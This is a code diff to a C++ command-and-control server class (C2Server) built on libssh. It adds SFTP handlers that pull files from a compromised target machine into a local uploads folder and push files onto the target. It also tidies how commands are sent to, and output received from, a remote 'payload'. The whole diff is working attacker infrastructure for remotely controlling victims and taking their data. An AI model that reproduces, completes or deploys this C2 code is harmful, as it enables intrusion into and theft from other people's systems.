@@ -104,6 +104,7 @@ void C2Server::handleConnection()
         return;
     }
 
+
     // main loop for communication
     std::string input;
     while (true)
@@ -134,8 +135,9 @@ void C2Server::handleConnection()
         else if (startsWith(input, "download"))
         {
             auto tokens = tokenize(input);
+            if (tokens.size() != 3)
             {
-                std::cerr << "[-] Incorrect upload syntax.\n";
+                std::cerr << "[-] Incorrect download syntax.\n";
                 continue;
             }
             sendMsg(input);
@@ -147,7 +149,7 @@ void C2Server::handleConnection()
             sendMsg(input);
 
             // and get command output from payload
-            std::cout << "[+] Got response from payload:\n" << rcvMsg() << std::endl;
+            std::cout << "[+] Got response from payload:\n" << trimEndNewLine(rcvMsg()) << std::endl;
         }
     }
 }
@@ -230,7 +232,7 @@ void C2Server::sendMsg(const std::string& msg)
 
 std::string C2Server::rcvMsg()
 {
-    char buffer[50000] { 0 };
+    char buffer[MAX_BUFF_SIZE] { 0 };
     if ((ssh_channel_read(channel, buffer, sizeof(buffer), 0)) <= 0)
     {
         std::cerr << "[-] Error while reading from channel\n";
@@ -243,13 +245,199 @@ void C2Server::handleUpload(std::string& localFilePath, std::string& remoteFileP
     std::cout << "[+] Starting upload from target machine (" << localFilePath
               << ") and saving as (" << remoteFilePath << ")\n";
 
-    // TODO
+    // make upload directory if it doesn't exist yet
+    auto dirName = "uploads";
+    if (!dirExists(dirName))
+    {
+        if (mkdir(dirName, 0777) == -1)
+        {
+            std::cout << "[-] Error creating uploads directory!\n";
+        }
+    }
+
+    sftp_session sftp;
+    if (!(sftp = setupSFTP()))
+    {
+        std::cerr << "[-] Error setting up SFTP.\n";
+        return;
+    }
+
+    sftp_client_message msg;
+    while ((msg = sftp_get_client_message(sftp)))
+    {
+        switch (sftp_client_message_get_type(msg))
+        {
+            case SSH_FXP_OPEN:
+                handleFileOpen(msg);
+                break;
+            case SSH_FXP_WRITE:;
+                handleFileWrite(msg);
+                break;
+            case SSH_FXP_CLOSE:
+                handleFileClose(msg);
+                break;
+            default:
+                /* unsupported type, nothing to do */
+                break;
+        }
+
+        // free resources
+        sftp_client_message_free(msg);
+    }
 }
 
 void C2Server::handleDownload(std::string& remoteFilePath, std::string& localFilePath)
 {
-    std::cout << "[+] Starting download of (" << localFilePath
-              << ") and saving as (" << remoteFilePath << ") on the target machine.\n";
+    std::cout << "[+] Starting download of (" << remoteFilePath
+              << ") and saving as (" << localFilePath << ") on the target machine.\n";
 
-    // TODO
+    sftp_session sftp;
+    if (!(sftp = setupSFTP()))
+    {
+        std::cerr << "[-] Error setting up SFTP.\n";
+        return;
+    }
+
+    sftp_client_message msg;
+    while ((msg = sftp_get_client_message(sftp)))
+    {
+        switch (sftp_client_message_get_type(msg))
+        {
+            case SSH_FXP_OPEN:
+                handleFileOpen(msg);
+                break;
+            case SSH_FXP_READ:
+                handleFileRead(msg);
+                break;
+            case SSH_FXP_CLOSE:
+                handleFileClose(msg);
+                break;
+            default:
+                /* unsupported type, nothing to do */
+                break;
+        }
+
+        // free resources
+        sftp_client_message_free(msg);
+    }
+}
+
+sftp_session C2Server::setupSFTP()
+{
+    ssh_message msg;
+    ssh_channel sftpChannel = nullptr;
+    sftp_session sftp = nullptr;
+
+    while ((msg = ssh_message_get(session)))
+    {
+        // open new channel for SFTP
+        if (ssh_message_type(msg) == SSH_REQUEST_CHANNEL_OPEN && ssh_message_subtype(msg) == SSH_CHANNEL_SESSION)
+        {
+            sftpChannel = ssh_message_channel_request_open_reply_accept(msg);
+        }
+
+        // wait for the subsystem request to initiate SFTP
+        if (sftpChannel != nullptr && ssh_message_type(msg) == SSH_REQUEST_CHANNEL && ssh_message_subtype(msg) == SSH_CHANNEL_REQUEST_SUBSYSTEM)
+        {
+            if (!strcmp(ssh_message_channel_request_subsystem(msg), "sftp"))
+            {
+                ssh_message_channel_request_reply_success(msg);
+
+                // create and init SFTP session
+                sftp = sftp_server_new(session, sftpChannel);
+                if (sftp == nullptr)
+                {
+                    std::cerr << "[-] Error allocating SFTP session: " + std::string(ssh_get_error(session));
+                    return nullptr;
+                }
+                int rc = sftp_server_init(sftp);
+                if (rc != SSH_OK)
+                {
+                    std::cerr << "[-] Error initializing SFTP session.\n";
+                    sftp_free(sftp);
+                    return nullptr;
+                }
+
+                return sftp;
+            }
+        }
+    }
+    return nullptr;
+}
+
+void C2Server::handleFileOpen(const sftp_client_message& msg)
+{
+    auto path = sftp_client_message_get_filename(msg);
+    auto flags = convertFlags(sftp_client_message_get_flags(msg));
+
+    // add prefix for the uploads folder if we're
+    // opening for uploading (= writing the file)
+    if (flags & O_WRONLY)
+    {
+        path = ("uploads/" + std::string(path)).c_str();
+    }
+
+    // open the file and get fd
+    int fd = open(path, flags, 0666);
+    if (fd < 0)
+    {
+        std::cerr << "[-] Opening file \"" << path << "\" failed with error " << errno << std::endl;
+        sftp_reply_status(msg, SSH_FX_FAILURE, "Failure");
+        return;
+    }
+    auto fdStr = std::to_string(fd);
+    auto handle = ssh_string_from_char(fdStr.c_str());
+
+    // send handle
+    sftp_reply_handle(msg, handle);
+
+    // free resources
+    ssh_string_free(handle);
+}
+
+void C2Server::handleFileWrite(const sftp_client_message& msg)
+{
+    auto fd = convertHandleToFileDescriptor(msg->handle);
+
+    // write data
+    auto data = sftp_client_message_get_data(msg);
+    auto ret = write(fd, data, strlen(data));
+    if (ret < 0)
+    {
+        std::cerr << "[-] Error while writing to file.\n";
+        sftp_reply_status(msg, SSH_FX_FAILURE, "Failure");
+        return;
+    }
+    sftp_reply_status(msg, SSH_FX_OK, "Success");
+}
+
+void C2Server::handleFileRead(const sftp_client_message& msg)
+{
+    char buffer[MAX_BUFF_SIZE];
+    auto fd = convertHandleToFileDescriptor(msg->handle);
+
+    // read data
+    auto ret = read(fd, buffer, msg->len);
+    if (ret < 0)
+    {
+        std::cerr << "[-] Error while reading from file.\n";
+        sftp_reply_status(msg, SSH_FX_FAILURE, "Failure");
+        return;
+    }
+
+    // send data
+    sftp_reply_data(msg, buffer, msg->len);
+    sftp_reply_status(msg, SSH_FX_EOF, "Success");
+}
+
+void C2Server::handleFileClose(const sftp_client_message& msg)
+{
+    auto fd = convertHandleToFileDescriptor(msg->handle);
+    if (close(fd) == -1)
+    {
+        std::cerr << "[-] Closing file handle failed with error " << errno << std::endl;
+        sftp_reply_status(msg, SSH_FX_FAILURE, "Failure");
+        return;
+    }
+    sftp_reply_status(msg, SSH_FX_OK, "Success");
 }
